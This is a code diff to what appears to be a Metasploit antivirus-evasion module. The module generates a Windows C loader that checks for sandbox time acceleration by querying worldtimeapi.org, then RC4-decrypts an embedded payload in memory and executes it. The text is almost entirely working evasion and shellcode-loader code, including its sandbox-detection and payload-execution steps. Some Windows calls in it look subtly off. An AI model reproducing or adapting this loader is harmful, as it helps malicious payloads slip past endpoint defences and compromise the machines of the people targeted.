@@ -151,7 +151,7 @@ end
 
 def get_includes()
   rc4 = "#include \"#{File.join(Msf::Config.install_root, 'data', 'headers', 'windows')}/rc4.h\""
-  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4, "#include <time.h>\n"]
+  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4, "#include <time.h>\n", "#include <stdlib.h>\n","#include <string.h>\n", "#include <winsock2.h>"]
   includes.shuffle
   return includes.join
 end
@@ -159,131 +159,137 @@ end
 
 def get_time_distorsion
   time_distorsion = %Q|
-      
-  int time_distortion()
-  {
-      DWORD mesure1 ;
-      DWORD mesure2 ;
-      #{junk_code(1)}
-      mesure1 = timeGetTime();
-      Sleep(1000);
-      mesure2 = timeGetTime();
-      #{junk_code(1)}
-      if((mesure2 > (mesure1+ 1000))&&(mesure2 < (mesure1+ 1200)))
-      {
-      #{junk_code(1)}
-      return 0;
-      }
-      else
-      {
-      exit(0);
-      #{junk_code(1)}
-      }
-      #{junk_code(1)}
+  
+  int extractField(const char *response, const char *fieldName, int *fieldValue) {
+    const char *delimiter = "\\n";
+    char *token;
+
+    token = strtok((char *)response, delimiter);
+
+    while (token != NULL) {
+        if (strstr(token, fieldName)) {
+            if (sscanf(token, "%*[^:]: %d", fieldValue) == 1) {
+                return 1;
+            } else {
+                return 0;
+            }
+        }
+
+        token = strtok(NULL, delimiter);
     }
+
+    return 0;
+  }
+
+  int get_time()
+  {
+    const char *hostname = "worldtimeapi.org";
+    const int port = 80;
+    const char *path = "/api/timezone/Europe/London.txt";
+
+     WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return EXIT_FAILURE;
+    }
+
+    struct hostent *host_info = gethostbyname(hostname);
+    if (host_info == NULL) {
+        WSACleanup();
+        exit(EXIT_FAILURE);
+    }
+
+    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (client_socket == -1) {
+        WSACleanup();
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in server_address;
+    server_address.sin_family = AF_INET;
+    server_address.sin_port = htons(port);
+    memcpy(&server_address.sin_addr, host_info->h_addr_list[0], host_info->h_length);
+
+    if (connect(client_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1) {
+        close(client_socket);
+        WSACleanup();
+        exit(EXIT_FAILURE);
+    }
+
+    const char *request_template = "GET %s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\n\\r\\n";
+    char request[4096];
+    snprintf(request, sizeof(request), request_template, path, hostname);
+
+    if (send(client_socket, request, strlen(request), 0) == -1) {
+        close(client_socket);
+        WSACleanup();
+        exit(EXIT_FAILURE);
+    }
+
+    char response[4096];
+    ssize_t received_bytes;
+
+    while ((received_bytes = recv(client_socket, response, sizeof(response) - 1, 0)) > 0) {
+        response[received_bytes] = '\0';
+    }
+
+    int unixtime;
+    extractField(response, "unixtime", &unixtime); 
+    close(client_socket);
+    WSACleanup();
+    return unixtime;
+  }
+
+  int time_distortion() {
+    int unixtime = get_time();
+    sleep(10);
+    int unixtime2 = get_time();
+    int diff = unixtime2 - unixtime;
+    if( diff < 11 )
+       exit(1); 
+    else
+      return (1);
+    return 0;
+  }
   |
 end
-
-
-def get_check_url()
-  fct_url = "int check_url() {\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "char url[] = \"https://www.#{Rex::Text.rand_text_alpha(rand(10..20))}.com\";\n"
-  fct_url += "HINTERNET httpopen, openurl;\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "DWORD read;\n"
-  fct_url += "httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "openurl=InternetOpenUrl(httpopen,url,NULL,NULL,INTERNET_FLAG_RELOAD\|INTERNET_FLAG_NO_CACHE_WRITE,NULL);\n"
-  fct_url += "if (!openurl) // Access failed, we are not in AV\n"
-  fct_url += "{\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "  InternetCloseHandle(httpopen);\n"
-  fct_url += "  InternetCloseHandle(openurl);\n"
-  fct_url += "  return 0;\n"
-  fct_url += "}\n"
-  fct_url += "InternetCloseHandle(httpopen);\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "InternetCloseHandle(openurl);\n"
-  fct_url += "  #{junk_code(1)}\n"
-  fct_url += "return 1;\n"
-  fct_url += "}\n"
-  return fct_url
-end
-
   def c_template
     @c_template ||= %Q|
 
 
 #{get_includes}
-#pragma comment(lib, "Psapi.lib")
-#pragma comment(lib, "Wininet.lib")
 
-int size  = #{get_payload[:size]};
-char buf[#{get_payload[:size]}];
-
-#define max_op #{rand(100000000..500000000)}
 
 #{junk_code(0).join}
 
-#{get_check_url}
 
 #{get_time_distorsion}
 
 int main(int argc, char **argv)
 {
-  int lpBufSize = sizeof(int) * size;
-  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
-  memset(lpBuf, '\\0', lpBufSize);
-  if (check_url())
+
+
+  if (time_distortion() == 0)
     exit(1);
+  int size  = #{get_payload[:size]};
+  char buf[#{get_payload[:size]}];
+  int lpBufSize = sizeof(int) * size;
   #{junk_code(1)}
-  int cpt = 0;
-  int i = 0;
+  LPVOID lpBuf = _malloca(lpBufSize);
   #{junk_code(1)}
-  for (i = 0; i < max_op; i++) {
-    cpt++;
-  }
-  if (cpt == max_op) {
-    ;
-  }
-   else {
-      exit(33);
-  }
-
-  #{junk_code(1)}
-  
-
-  time_distortion();
+  memset(lpBuf, '\\0', lpBufSize);
   #{get_payload_bytes}
   
   #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  Sleep(10000);
   RC4("#{rc4_key}", buf, (char*) lpBuf, size);
+  #{junk_code(1)}
     void (*func)();
   #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
     func = (void (*)()) lpBuf;
-    #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
   #{junk_code(1)}
     (void)(*func)();
   #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
     return 0;
+  #{junk_code(1)}
 }|
   end
 
@@ -291,7 +297,7 @@ int main(int argc, char **argv)
     fname = Rex::Text.rand_text_alpha(4..7)
     path = File.join(Msf::Config.local_directory, fname)
     full_path = ::File.expand_path(path)
-    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: " -lpsapi -lwininet -lwinmm -w " })
+    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: " -lpsapi -lwininet -lwinmm -lws2_32 -w " })
     output = m.compile_c(c_template)
     if output.length > 0
       print_error(output)
